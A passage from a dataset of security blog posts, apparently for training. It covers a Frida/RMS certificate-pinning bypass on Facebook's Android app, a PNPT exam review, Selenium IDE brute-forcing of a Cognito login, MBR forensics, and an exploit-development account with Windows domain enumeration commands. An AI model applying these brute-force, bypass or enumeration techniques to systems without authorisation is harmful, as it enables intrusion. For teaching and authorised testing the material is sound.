\nsunfish:/data/local/tmp # chmod 777 ./frida-server-15.2.2-android-arm64 \nsunfish:/data/local/tmp # ./frida-server-15.2.2-android-arm64 & \n[1] 14535\n\nNow run frida-ps -U and you should see a list of packages:\n\n$ frida-ps -U \n PID Name\n----- -------------------------------------------------------\n2598 .dataservices \n2614 .qtidataservices \n10851 Facebook \n3687 Google \n11718 Magisk \n8655 Photos \n12474 Settings \n1482 adbd \n1317 adsprpcd\n \n\nFrida works, so we're ready to connect to the agent it with RMS.\n\nStart RMS\n\nThe rms command will start the web interface locally on port 5000:\n\n$ rms\n_________________________________________________________\nRMS - Runtime Mobile Security\nVersion: 1.5.11\nby @mobilesecurity_\nTwitter Profile: https://twitter.com/mobilesecurity_\n_________________________________________________________\n\nNavigate to http://localhost:5000 in a web browser.\n\nRMS can be used for iOS phones as well, so choose the Android option under 'Mobile OS'.\n\nThe Facebook Android app has cert pinning, so we will use it as an example. Set com.facebook.katana under 'Package name.'\n\nRMS can spawn an app with Frida already hooked, or it can attach to a running process. I have never had much luck with the Attach function, so choose Spawn.\n\nWe can give Frida our own JavaScript to run, but it comes with a set of default scripts to perform common bypasses. Multiple cert pinning bypasses are included in this set.\n\nI've had good results with ssl_pinning_multi_bypass.js, so choose this under 'Load Default Frida Scripts':\n\nChoose 'Start RMS' and the app should open on the phone, and traffic should show in the Burp proxy.\n\nClosing thoughts\n\nHopefully collecting all this information in one place saves someone time in the future. Inevitably these steps will become obsolete as Google continues to change the Android OS. As of October 2022, this process worked for me. Hopefully it works for you.\n\nThanks to Lance Pendergrass for some of the techniques, and Carrie Roberts for the inspiration & guidance.\n\n---\n\n*Jeff has been in various infosec roles for over a decade, including 7 years as a penetration tester and a recent transition to cloud security engineer. Thank you for sharing your knowledge with us, Jeff!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PNPT: Certification Review\"\nTaxonomies: \"Daniel Pizarro, External/Internal, General InfoSec Tips & Tricks, Informational, LLMNR, Password Cracking, Password Spray, Recon, Red Team, Red Team Tools, Web App, Cybersecurity Certification, PNPT\"\nCreation Date: \"Tue, 31 Jan 2023 12:52:59 +0000\"\nDaniel Pizarro //\n\nWhat is the PNPT? \n\nThe Practical Network Penetration Tester (PNPT), created by TCM Security (TCMS), is a 5-day ethical hacking certification exam that assesses a pentester's ability to perform an external and internal network penetration test. To complete the exam, pentesters must: \n\nPerform reconnaissance to gather intelligence \n\nLeverage common web server vulnerabilities to breach the perimeter  \n\nLeverage Active Directory (AD) vulnerabilities to move laterally and vertically within the network \n\nCompromise the Domain Controller (DC) \n\nProduce a professionally written pentest report \n\nDeliver a live report debrief to TCMS assessors \n\nPNPT Exam Preparation & Tips \n\nThe PNPT exam follows a series of training courses developed by TCMS and covers a range of methodologies and topics. A complete syllabus and exam overview is available on the TCMS website. Below are a few exam preparation tips and suggestions. \n\nAs expected, tools pivotal to completing the exam include Nmap, Burp Suite, Nessus, Metasploit, Impacket scripts, hash crackers, and other software built into Kali Linux. \n\nReconnaissance and Enumeration: Reconnaissance and enumeration are essential parts of any penetration test. Be patient. When performing recon, targeting a domain, and leveraging a newly compromised operating system, be thorough about gathering and pillaging information, as one piece of data may be utilized at different portions of the assessment. \n\nActive Directory: Active Directory stores information about objects on the network, making the information easy for administrators and users to find and use. A comfortable knowledge of AD and common network-based attacks is required to complete the PNPT exam. As mentioned, numerous tools built into Kali Linux were utilized during the exam. Understand what the tools do and how pentesters leverage them to advance their position within an Active Directory environment. \n\nWindows Credential Storages: Windows will store sensitive information in various parts of the operating system. Understand how Windows protects data and how pentesters may extract them. \n\nWindows Account Privileges: Windows environments will support different account types with specific user privileges and capabilities. Familiarity with the account types and their respective privileges is important (e.g., standard user, local administrator, service account, domain administrator). Understanding the differences and quickly identifying their capabilities will make the exam more navigable. \n\nAs for general tips: \n\nOnly follow rabbit holes for a few hours. If something seems too elaborate or complex, move on to other avenues. The PNPT exam is not a CTF and closely emulates a (small) real-world AD environment. \n\nBe patient with escalation points; don't overthink. Think like an APT and focus on common attacks as seen in PNPT training labs and documented in the MITRE ATT&CK Framework. \n\nWhen stuck, take a step back. Reconsider the information discovered previously and other ways pentesters will leverage the data. \n\nIn addition to the PNPT training labs, several HackTheBox labs are worth completing before attempting the exam, as they cover valuable topics and tool usage. \n\nActive: SMB null authentication, Active Directory queries, GPO and GPP, Bloodhound usage, and hash cracking. \n\nMonteverde: ADConnect, MSSQL databases, Windows post-exploitation, and spidering SMB shares. \n\nSearch: User reconnaissance, Kerbrute usage, PFX certificate cracking, PowerShell web access, AV evasion, and Nishang scripts. \n\nScrambled: Impacket scripts, TGT, KRB5CCNAME usage, LDAP queries, SID enumeration via PAC, and MSSQLClient usage. \n\nReporting \n\nThe PNPT certification sets itself apart from most offensive certifications by emphasizing the report quality and the post-engagement debrief. \n\nAt BHIS, we take pride in the quality of the reports we deliver to clients. As a result, there's no shortage of excellent content on the BHIS website dedicated to what makes a stellar pentest report. \n\nhttps://www.blackhillsinfosec.com/your-reporting-matters-how-to-improve-pen-test-reporting/ \n\nhttps://www.blackhillsinfosec.com/how-to-not-suck-at-reporting-or-how-to-write-great-pentesting-reports/ \n\nhttps://youtube.com/watch?v=bJ4gJVXPAS0&si=EnSIkaIECMiOmarE&t=2885\n\nDebriefing\n\nUpon submitting the report, the TCMS team will schedule an on-camera debrief via Zoom to review the Findings documented in the report. The debrief is straightforward. The TCMS assessor will ask for a photo ID as proof of identity, an overview of vulnerabilities discovered during the exam, and an explanation of how the domain controller was ultimately compromised. \n\nAt this point, focus on creating a narrative; tell a story, and remember to highlight critical portions of the assessment. \n\nWhat vulnerabilities and security misconfigurations did you discover? \n\nWhich tools and techniques did you utilize to exploit vulnerabilities? \n\nHow might a security engineer defend against such attacks in the future? \n\nWalk the assessor through each crucial vulnerability leveraged during the exam from beginning to end. \n\nConclusion \n\nAs a learning tool, the PNPT exam and companion training courses provide enormous value for the price point. Unlike other cyber certifications, the PNPT did not feel like an unrealistic, gamified CTF, making it a fantastic resource for anyone interested in gaining well-rounded knowledge of pentesting methodologies and Windows infrastructure. Overall, it was a fun experience. I appreciated the thought behind the attacks required to compromise the domain controller and look forward to exams produced by TCMS in the future. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a Pentest Robot With Selenium IDE\"\nTaxonomies: \"External/Internal, How-To, Mobile, Password Spray, Red Team, Sean Verity, Web App\"\nCreation Date: \"Thu, 02 Feb 2023 16:51:52 +0000\"\nSean Verity //\n\nHave you ever been on a pentest and thought to yourself, \u201cI wish I had a robot to do this testing for me right now cuz this is just too much work\u201d?\n\nI know I have. That\u2019s how I came to use the QA tool, Selenium IDE, to automate things like:\n\nBrute forcing complicated authentication protocols. See Amazon Cognito\u2019s implementation of Secure Remote Password, for example.\n\nPassword spraying services where tooling is not available and there\u2019s not enough time and/or willpower to figure out how to configure a Burp Suite Intruder attack with complicated CSRF mitigations.\n\nHarvesting email addresses from organizations\u2019 websites when they are dynamically rendered (i.e. nothing to grep from the HTML source).\n\nWorking around Google reCAPTCHA. Selenium IDE automation can help with the transparent sort of reCAPTCHA where a JavaScript challenge needs to be solved (not the annoying \u201cClick all the panda bears in this grid\u201d type of challenge).\n\nBefore we get started though, I want to point out that the demo to be presented in this blog was atypical insofar as there were some unique challenges presented with this particular app. My goal with this blog is to provide you with a reference for ideas on how to troubleshoot when your Selenium IDE tests aren\u2019t working. It is typically much easier to automate your browser with Selenium IDE.\n\nTo show you how to build a pentest robot with Selenium IDE, we\u2019ll take a look at how to brute force an example React app that I put together. The example app was built by following this excellent blog: Build an Authentication System with AWS Amplify, Cognito and React. The app uses Amazon Cognito\u2019s SRP for authentication which, as we\u2019ll see, is just about impossible to automate with Burp Suite\u2019s Intruder module.\n\nAccording to Wikipedia, SRP is \u201can augmented password-authenticated key exchange (PAKE) protocol\u201d where \u201cthe password never leaves the client.\u201d1 That second phrase already sounds like a deal breaker for running a Burp Intruder attack. Usually, when using Burp Intruder for authentication attacks, you need to mark the password position in the HTTP request. If the password never leaves the client though (i.e. password is not sent in HTTP request), how can you mark the password position?\n\nHere's what the login form looked like for my React app during authentication.\n\nRequests were sent to \u201ccognito-idp.us-east-2.amazonaws.com\u201d after clicking the \u201cSign In\u201d button. As can be seen in the following screenshot, the username was pretty easy to spot. The password\u2026not so much. It seems that Wikipedia was right about the password not leaving the client.\n\nSince using Burp Intruder won\u2019t work for brute forcing this login form, I considered writing a Burp extension that implemented SRP. Before going down that rabbit hole, though, I took a peek at what would need to be implemented. The screenshot below was taken from a Stanford University webpage that describes the SRP Protocol Design.\n\nPrime, modulo, salt, exponentiation, you say?\n\nIt would probably be easier to build a robot that would do this brute force testing for me. Ok, so maybe the robot idea isn\u2019t actually feasible either. But what if there was a tool that was easy to install and easy to configure (most of the time) that would automatically fill in the login form fields and click the \u201cSign In\u201d button? Ah, but there is such a tool! And its name is Selenium IDE (SIDE).\n\nTo find and install SIDE, you can search your browser\u2019s extension store or favorite search engine for \u201cselenium ide.\u201d After installing SIDE, there\u2019s some preliminary things to do like naming the project and setting the base URL. The base URL is where you want SIDE to start the test from. In the same window where you enter the base URL, there will be a button titled, \u201cStart Recording.\u201d This will open a new browser instance with a bubble at the bottom of the window that says, \u201cSelenium IDE is recording...\u201d. Since I\u2019m going to be brute forcing the login form, I just need to fill out the login form and click the \u201cSign In\u201d button like a typical user.\n\nAfter logging in, I\u2019m redirected to a very basic dashboard which indicates that I\u2019ve authenticated.\n\nAll that I needed to record was the login process so I clicked the stop recording button and named the test. At this point, the next step is to verify that the login process was recorded successfully by clicking the \u201cPlay\u201d button. There are a couple of \u201cPlay\u201d buttons in the UI. The one on the left will play back all of the tests inside of a project whereas the one on the right will only play back the selected test. Since there is only one test at this point, either button would work.\n\nAfter I clicked the \u201cPlay\u201d button, SIDE ran the test and the log indicated that the test completed successfully. However, the browser was still on the login page as opposed to the dashboard after the login form was submitted. While watching the test run, there was no data being entered into either form field.\n\nAfter much blood, sweat, and tears were shed while putting together this demo, I learned that the problem lay in SIDE\u2019s inability to find elements inside of a \u201cshadow DOM.\u201d2 Shadow DOM is basically a DOM that is nested inside of a DOM, which sounds to me like a recipe for use-after-free bugs, but that\u2019s another topic and I\u2019m sure there are really good reasons why shadow DOM exists, but I digress. Since both form fields lived in shadow DOMs, I had to try a different approach to populating the form fields. SIDE has an \u201cexecute script\u201d command which will execute JavaScript inside of the DOM where your test is running. We can use this command to select and populate the form fields.\n\nNow before we go and start rage coding JavaScript inside the SIDE UI like a crazy person, let\u2019s take a step back and make sure that the JavaScript is sound, using the JavaScript console in 00DevTools. I decided to start with a simple task of writing a line of JavaScript that would select the username field and populate it with an arbitrary username. The first thing to figure out is how to access the username field. Usually, you can use something like the document.getElementById()3 method and pass the ID of the targeted element. In this case, it appeared that the username form field ID was \u201cusername.\u201d It also looked like there was an event handler for \u201cinput\u201d events attached to it.\n\nIf my assumptions were correct, then calling document.getElementById(\u201cusername\u201d) would return the string, \u201cabcdef\u201d. Let\u2019s test this theory out in the console tab.\n\nUgh. Looks like I need to dig a little deeper to come up with a way to select this form field. Not that we didn\u2019t already know that, since I mentioned the shadow DOM issue earlier. If we take another look at where the username form field is located, we can see that it\u2019s inside of a shadow DOM, which is nested inside of another shadow DOM, that is nested inside of the DOM. Easy peasy, yeah?\n\nThe other thing to take note of here is that there aren\u2019t a whole lot of element IDs to traverse in the shadow DOMs, which means that we can\u2019t use getElementById() to traverse the shadow DOMs. No big deal though. We can use the document.querySelector()4 method instead. To select the username form field, we\u2019re going to:\n\nSelect the element right before the first shadow DOM root with querySelector()\n\nSelect the shadowRoot property\n\nSelect the element right before the second shadow DOM root\n\nSelect the shadowRoot property\n\nAt this point, we\u2019ll be inside of the second shadow DOM so we can use getElementById(\u201cusername\u201d) to select the username field\n\nHere\u2019s what all of that looks like in the console.\n\nNow that we have some working JavaScript to get the username form field value, we just need to make a minor tweak to set the username value. The other piece that needs to be accounted for is the event handler that I highlighted earlier. This piece isn\u2019t so bad though. We can use the same form field selector code then call dispatchEvent()5 method on it to send the \u201cinput\u201d event. Here\u2019s what the JavaScript looks like in the console tab.\n\nAt this point, we have all of the JavaScript needed to select and populate the username form field. The next step is to use the same techniques to populate the password field and call the click() method on the \u201cSign In\u201d button. Here\u2019s what the final JavaScript looked like. \n\nEach line of JavaScript can be copied into a SIDE \u201cexecute script\u201d command. BTW, I deleted all the \u201cclick\u201d commands from the original test since they weren\u2019t doing anything useful. Here\u2019s what the final SIDE test to login looked like.\n\nTo make sure this works, let\u2019s click the \u201cPlay\u201d button. If all goes according to plan, the new SIDE test will login to the app and stop at the dashboard.\n\nIt worked! Now that we have the login piece automated, we need the SIDE test to loop through a list of passwords for brute forcing. We\u2019ll use a little bit of JavaScript to create an array of passwords, SIDE\u2019s \u201creturn\u201d keyword to access the array, and SIDE\u2019s \u201cfor each\u201d command to iterate through the array. To start, right click on the first command inside of SIDE to insert a new command before the login process.\n\nThis first command will return an array of passwords to SIDE, named \u201cpasswordList\u201d.\n\nNext, I\u2019ll add \u201cfor each\u201d and \u201cend\u201d commands to loop through the passwordList array. The array name will go in the \u201cTarget\u201d field and the iterator name will go in the \u201cValue\u201d field of the \u201cfor each\u201d command. The \u201cend\u201d command is also needed at the very end of the test to close the loop.\n\nThe last step is to remove the hard-coded password from the command that populates the password form field, and replace it with the iterator variable. The syntax for accessing SIDE variables is ${variable}. One other change that I\u2019m going to make to this test is adding a three second delay after each login attempt with the \u201cpause\u201d command. The duration is entered in milliseconds. SIDE warned me that \u201cHard coded sleeps are old hat,\u201d but we know better, so I clicked on the OK button.\n\nThe delay gives the app enough time to process the login request. On a SIDE note \ud83d\ude09, when troubleshooting a SIDE test that fails to execute, my first move is to add a delay. I\u2019ve found this to be pretty effective most of the time.\n\nHere\u2019s what the final SIDE test looked like to brute force the app. At a mere ten lines of \u201ccode,\u201d that\u2019s not too bad, eh?\n\nI hope you\u2019re not too disappointed that I didn\u2019t show you how to build a robot, but hopefully you came up with some ideas on how you could use Selenium IDE on your next pentest or red team assessment when you\u2019re short on time or tooling.\n\nReferences\n\n[1] https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol \n\n[2] https://glazkov.com/2011/01/14/what-the-heck-is-shadow-dom/#:~:text=Shadow%20DOM%20refers%20to%20the,the%20main%20document%20DOM%20tree.\n\n[3] https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById\n\n[4] https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector \n\n[5] https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/dispatchEvent \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Who's Bootin'? Dissecting the Master Boot Record\"\nTaxonomies: \"Blue Team, DFIR, General InfoSec Tips & Tricks, Hal Denton, How-To, Informational, Digital Forensics and Incident Response, Master Boot Record\"\nCreation Date: \"Tue, 07 Feb 2023 16:36:39 +0000\"\nHal Denton //\n\nHave you ever been given an encrypted hard drive to perform forensic analysis on? What could go wrong? \n\nProbably the first thought rolling through your mind is wondering if the decryption key was included with the drive. If so, you are spot on in questioning that, as the analysis would be pretty much undoable without the decryption key. What if you have the decryption key but your forensic software doesn\u2019t prompt you for the challenge/response to decrypt the drive? What do you do next?\n\nIn this blog, I will be talking about a scenario where things went wrong with what was supposed to be an acquisition of an encrypted full disk image, but... I received an encrypted volume. At the end of this post, you should understand the Master Boot Record (MBR) and how to manipulate it.  \n\nAs a forensic practitioner, sometimes we need to dig in and figure out how things work.  \n\nBefore we get started, one core term you will need to know: what is a sector on a hard drive? A sector is the smallest storage unit on disk and, typically, 512 bytes in size (it could also be bigger depending on the capacity of the drive). Additionally, you will need to know common sector address types, such as Cylinder Head Sector (CHS) and Logical Block Address (LBA). CHS uses disk geometry to map sectors to a head and cylinder number per platter, which requires a translation from the OS to BIOS to find the data on disk. CHS does not work on disks larger than 8.1GB. A predecessor to CHS is LBA, and it assigns sequential addresses to each sector, which eliminates the need to do a translation. The Operating System tells BIOS the address for where to find it on disk. LBA works on disks as large a 2TB due to the limitation of the MBR 32bit addressing.\n\nMaster Boot Record (MBR) Summary\n\nThe MBR is assembly code that is 512 bytes in length and is located at sector 0 on a hard drive. Below is an example of an MBR viewed in a hex editor that I will be using to breakdown the 3 data structures that make up the MBR.\n\nTo help understand the hex editor view, the one I am using displays data into 3 columns, as labeled below. Column 1 tells you the byte offset of the first byte in the row. For example, if I wanted to manually check what the value is at byte offset 450, I can use column 1 to find the closest offset to 450, which is 448 (value 21) below, and count to the right two bytes (value 07). Column 2 shows the hex values of the data that was loaded into the hex editor, and column 3 shows the ASCII character conversion of the hex values.\n\nMBR \u2013 Data Structure Overview\n\nThe 3 data structures that make up the MBR is boot code, partition data, and the end of MBR signature. I will break down each structure by byte range and byte length so you will have a general understanding of each. \n\nTo validate our MBR by math, the total byte size should be 512 bytes (446+16+16+16+16+2=512 bytes).\n\nMBR \u2013 Boot Code Summary\n\nBoot code holds instructions to tell the computer how to process the partition tables and locate the operating system.\n\nMBR \u2013 Partition Information Summary\n\nPartitions are 16 bytes in length and hold up to four standard partitions for drives with 512 byte sectors. There can be more than 4 partitions by using an extended partition. A type field identifies what type of data should exist, such as FAT, NTFS, etc. Below shows where all 4 partitions are in the MBR and identifies each one.\n\nMBR \u2013 1st Partition\n\nMBR \u2013 2nd Partition\n\nMBR \u2013 3rd Partition\n\nMBR \u2013 4th Partition\n\nMBR \u2013 End of MBR Signature\n\nAt the end of the MBR is 55 AA. You can think of this as a footer of the MBR. The footer typically signifies the end of the structure. Some file structures have headers and footers to identify the beginning and end of the structure. For an example, you can reference JPEG\u2019s file structure to see the header (SOI) and footer (EOI).\n\nNow that you have a general understanding of the MBR data structures, let's break down the partition information even more so we know how to manipulate it. I will break down partition 1 and 2 below to help you grasp what the bytes mean by including a table of the bytes that make up their partition information. Partitions 3 and 4 are null (00), or blank, which means the MBR only has two partitions (partition 1 and 2).\n\nMBR \u2013 1st Partition Explained\n\nWhen reading the MBR, remember this is assembly code and needs to be read from right to left. To help with the conversion, I read from byte 461 to byte 446 from right-to-left, and write down left-to-right. Additionally, if you decide to use the table below, fill in the partition data from bottom-to-top, starting with the size in sectors.\n\nConvert addresses from hex to decimal, to identify starting sector and size of the partition. Yep, just like in school \u2014 let's pull out those TI\u2019s, your OS calculator, or online converter (*cough* CyberChef *cough*) to make the conversion. Below is a screenshot of the Windows calculator (changed to programmer mode). When you enter the hex values, it will be converted to decimal for you.\n\nMBR \u2013 2nd Partition Explained\n\nRepeat the same process as in breaking down the 1st partition, but read from byte 477 to byte 462 from right-to-left, but write down left-to-right.\n\nPutting it all together now\u2026\n\nNow that I understood how the MBR works, I created a 512 byte MBR file and modified \u201cpartition 1\u201d information for the LBA start address to be at sector 1. To accomplish that, I had to convert 1 (decimal) into hex (0001) but also put in reverse order (1000) so the LBA address could be properly read. Then I appended the acquired image to my synthetic MBR file.  I proceeded to add the new image to the forensics tool and \u2014 badda bing badda boom \u2014 received my challenge and response prompt to decrypt the drive.\n\nTools\n\nPartition identification/validation:\n\nThe Sleuth Kit (TSK) utility called mmls can identify partition information, including start and end locations, and length of each partition.\n\nPartition data manipulation:\n\nA hex editor can be used to view raw contents of a drive or make modifications. Several are available that are open source or have free trials \u2014\n\nLinux: Bless, hexyl\n\nWindows: 010 Editor, Notepad++\n\nReferences\n\nFile System Forensic Analysis by Brian Carrier: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172\n\nMaster Boot Record: https://www.researchgate.net/publication/300373786_Analyzing_Master_Boot_Record_for_Forensic_Investigations\n\nJPEG file structure: https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure\n\nThe Sleuth Kit: https://sleuthkit.org/\n\nBless Hex Editor: https://github.com/afrantzis/bless\n\nHexyl Hex Editor: https://github.com/sharkdp/hexyl\n\n010 Editor: https://www.sweetscape.com/010editor/\n\nNotepad++ Hex Editor: https://notepad-plus-plus.org/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Exploit Development - A Sincere Form of Flattery\"\nTaxonomies: \"Informational, moth, Exploit Development, Python, Scapy, TCPDump, Vulnerability, Wireshark\"\nCreation Date: \"Thu, 09 Feb 2023 18:31:42 +0000\"\nmoth //\n\nRecently, BHIS penetration tester Dale Hobbs was on an Internal Network Penetration Test and came across an RPC-based arbitrary command execution vulnerability in his vulnerability scan results. \n\nNessus Plugin ID 59642 \n\nI had mentioned in passing that I was working on learning more about remote procedure calls, and Dale invited me to take a look at this vulnerability with him, an invitation that I happily accepted. \n\nQuick disclaimer before the party starts: All credit to the initial disclosure of this vulnerability goes to Ron Bowes and Tenable. Even though this vulnerability is 10 years old at this point, this blog post will unfortunately not be accompanied by exploit code in order to protect Tenable's intellectual property rights. For the same reason, specific exploit bytes are also redacted in cases where they were taken directly from packet captures. While I would love to eventually release the exploit code to the public for the benefit of other information security practitioners, this blog post instead focuses on the process of creating (and more importantly troubleshooting) exploit development. \n\nWith all of that out of the way \u2014 it's party time. \n\nVulnerability Details \n\nLet's start this adventure by looking at what Nessus has to say about this vulnerability. Nessus Plugin ID 59642 details that the vulnerability allows privileged command execution through an unauthenticated RPC interface. \n\nVulnerability Details \n\nSounds relatively simple, but I've been burnt by assumptions of simplicity countless times before this. Before getting too eager, let's take a look at what other information is available regarding the vulnerability. The upSploit URL in the references section looks promising, so let's go there first and\u2014 \n\nUnable to Browse to upSploit.com \n\nOh. Ok, maybe the Internet Archive has a reference to it. Plugging in the URL, there turned out to be a single copy of the page, saved in 2013. \n\nArchive Search Results for Vulnerability Disclosure \n\nWell, let's take a look and see what we're working with. According to the archived article, a typical exploit connection looks something like the following: \n\nSelect the vulnerable interface, unidata72 \n\nAuthenticate (opcode 0x04) \n\nPerform operations such as running OS commands (opcode 0x06) \n\nAlright, that's a start, but it'd be really cool to see how Nessus is exploiting this vulnerability. According to Tenable, there are no known exploits available for the vulnerability. \n\nNo Known Exploits Available \n\nMaybe looking at their script source code will give some insights, as can often be done for other findings during a test. Looking at the plugin file name will show us where to look and\u2014\n\nNessus Script Filename \n\nAh. Uncool. From what I've read, an nbin file is a compiled Nessus file format that allows vendors to provide proof-of-concept code without disclosing the technical details to everybody. A good idea, but frustrating to run into while testing. Clearly, Nessus has some secret sauce going on, because the vulnerability scan shows that the ipconfig Windows command was successfully executed, and the output was received. \n\nVulnerability Exploited by Nessus \n\nSo, here's the million-dollar question: How can we figure out what an nbin file is doing if we can't see the source code? After mulling this over, Dale had an idea that led us down the road to our eventual destination of having a working exploit. \n\nMonkey See (Pcaps of Nessus) \n\nDale was able to configure his vulnerability scanner to just run the specific plugin. He began a packet capture (pcap), ran the limited vulnerability scan, and then sent the resulting pcap file over to me so we could both look at the results. With the pcap in hand, we were then able to toss it into Wireshark and take a look at the relevant stream by searching for ipconfig in the packet bytes. The relevant TCP stream is shown below. IP addresses have been redacted. In the case where the last octet is shown, \".32\" represents the testing host and \".74\" represents the target host. \n\nTCP Stream Intercepted from Nessus \n\nBy following the TCP stream in Wireshark, another window is opened to display an ASCII view of the relevant conversation. \n\nTCP Stream (ASCII) \n\nNow that we've taken a look at the ASCII representation of the TCP stream, let's switch the output to Raw to see what bytes are being sent to the server. \n\nTCP Stream (Raw) \n\nThe two heavily redacted lines in red are sent from the client to the server, and that's what we'll be referencing in order to start crafting our own exploit. But first, it's maybe best for us to analyze the communication a bit closer. The following diagram shows an annotated look at what we saw while listening to the conversation: \n\nTCP Stream Sequence Diagram \n\nWith a better understanding of the vulnerability, and with the packet capture serving as a model of successful exploitation, it's time to start writing our own exploit. \n\nMonkey Do (Exploit Construction and Troubleshooting) \n\nAfter an unsuccessful but mercifully brief attempt at writing the exploit in C, I was convinced by fellow BHIS penetration tester David Fletcher to switch to Python and Scapy. After some time getting reacquainted with Scapy, it was time to start building in earnest. The first step was to build all of the necessary packets sent by the client. \n\nMy first naive attempt of using Scapy to build the exploit predictably went poorly and was not made easier by the fact that I did not initially have access to directly experiment with the vulnerable system. Instead, I relied on a simple HTTP server running on a machine I controlled, just to get the conversation structure set up properly before running it live against the target. According to Wireshark, it looks like a few things went wrong all at the same time. \n\nOops, All Errors! \n\nBy adding some debugging output to the exploit to print the sequence and acknowledgement numbers, we can see that the numbers aren't being updated properly, as the acknowledgement number is supposed to be changing. \n\nExploit Debugging Output \n\nAt this point, it was getting to be early evening on Friday, and I was feeling like giving up, as our time frame to work on this vulnerability was quickly coming to a close. I got up for a walk to clear my head. I spent the first few minutes of my walk messaging David about some of the issues I was encountering, and he graciously gave me some good pointers. Clearly my sequence and acknowledgement numbers weren't adding up, and we discussed the required update logic until I finally had a rough understanding of what needed changing. By the time I got back from my walk, I was convinced that we needed to see this through, and so we did. \n\nI woke up the next afternoon and got on my computer to start looking at what exactly was wrong with my sequence and acknowledgement numbers. After tweaking the relevant number update logic, I checked Wireshark again and observed that the behavior seemed a bit better. \n\nFirst Fix of Sequence and Acknowledgement Numbers \n\nThat said, I was still seeing a lot of \"Destination unreachable (Communication administratively filtered)\" in Wireshark, which confused me. On a virtual machine, I instead observed reset packets sent from the client to the server in response to every packet received. \n\nAll Packets Reset in Virtual Machine \n\nSo, what's going on here? It turns out that Scapy's troubleshooting documentation has a note on this very issue. The issue boils down to the client operating system responding to packets with a reset because the conversation did not originate from the client operating system directly. The Scapy documentation notes that the issue can be circumvented with an iptables command: \n\niptables -I OUTPUT -d xxx.xxx.xxx.74 -j DROP \n\nFrom my (and David's) understanding, the firewall rule is necessary to prevent our host from killing a connection when it sees packets in conversations that didn't originate from the OS's own network stack. The OS sees the response packets from the server and sends resets because the OS isn't aware that Scapy is the one handling the conversation. \n\nWith the firewall rule in place, I was able to verify that packets were being sent and received properly from my virtual machine to my test server. The following screenshot shows the closest I could get in testing to verify functionality without having Dale test it in his client's environment. \n\nFinal Local Test \n\nI sent the latest exploit to Dale and had him run it. From the looks of the resulting pcap file, we can see that we're about halfway there. From the errors, it looked like the sequence and acknowledgement numbers were still slightly incorrect. \n\nFirst Half of Exploit Working \n\nThe issue was fixed by removing an erroneous + 1 from the else block shown below. The following screenshot shows the final sequence/acknowledgement number update function: \n\nFinal Fix of Sequence and Acknowledgement Number Update Logic \n\nAfter sending Dale the modified exploit, I logged off for the day to enjoy the rest of my Saturday. I woke up the next morning to an unexpected message from Dale: The exploit had worked. \n\nAfter some celebration, my eyes were drawn to the end of the resulting output, shown below. \n\nFirst Exploit Success \n\n...Where's the rest of our command output? The exploit performed by Nessus only had a single response packet containing all of the command output. Dale provided another pcap and we were able to see that the command output response was being split into two packets. The missing command output was contained within the second of two packets highlighted in the following screenshot. \n\nCommand Output Fragmented \n\nTalking again with David, he noted that the packet options were likely incorrect. This prompted me to take a look at the packet options used by Nessus: \n\nPacket Options from Nessus Exploit \n\nFrom what I could see, the SYN packet needed to specify a large window size, maximum segment size, and window scale. Doing so was relatively easy by plugging in some Scapy options into the packet. \n\nPacket Options Updated in Exploit Code \n\nWhile doing that, I also took the opportunity to clean up the output and added arbitrary command output support. \n\nWhile implementing the ability to specify arbitrary commands, I reviewed the padding present in the command packet. The original packet observed from Nessus had four bytes of padding. This padding is likely to be important, but I figured it would be interesting to confirm. I removed most of the padding from the packet and observed that the server\u2019s response contained no command output, as shown in the following screenshot: \n\nUnsuccessful Exploitation with Invalid Command Padding \n\nLooking at the payload length of the second PSH ACK packet sent from the client, we can figure out the most likely padding value. The payload length is 56 bytes. Given that there are four bytes of padding, we can safely guess that padding is done to make the payload length to be a multiple of eight bytes, because 52 mod 8 is 4 and 52 plus 4 is 56. With that in mind, I kludged together the necessary padding in the code: \n\nPadding Logic \n\nWith the padding fixed, we were then able to issue commands to the vulnerable server. Seeing the properly formatted ipconfig output was equal parts thrilling and relieving. \n\nSuccessful Vulnerability Exploitation \n\nAfter that, we were pretty much done. Dale requested an option to disable the sequence and acknowledgement number output, which I obliged by making that part of a new verbose option. \n\nDemo\n\nTo verify that the arbitrary command execution part of this whole deal was working, Dale ran a few additional commands, namely a simple whoami command and a more complex net group 'Domain Admins' /domain command. Both commands worked like a charm. \n\nSuccessful \"whoami\" Command Execution \n\nSuccessful \"net group\" Command Execution \n\nConclusion \n\nAnd with that, my first successful adventure in exploit development is at a close. I suppose I should sum up some lessons learned during this process, especially given that I can't publish the code: \n\nPick the right tool for the job, and don't be afraid to switch gears if you picked incorrectly. I most likely could have made something work in C, but Python with Scapy was clearly the path of least resistance and helped us get something working in a reasonable amount of time. \n\nDon't quit too early. If I had gone with my original plan and given up on Friday afternoon, we wouldn't have gotten this working (and you wouldn't be reading this). \n\nAlways accept invitations to collaborate. The best part of sharing projects with other testers is that it might prompt them to ask about related challenges they're working on. I've said yes to every invitation I've received on that front, and I've rarely ever been disappointed. \n\nMy sincerest thanks to Ron Bowes and Tenable for the vulnerability disclosure and details, to penetration testers like David Fletcher for giving me pointers in the right direction (and also general encouragement), and finally to Dale Hobbs for inviting me to go on this adventure with him, for testing the exploit code, and providing me pcaps over the weekend while I was finishing the code up. \n\n"
    },
    {
        "input": "",
        "instruction": "",
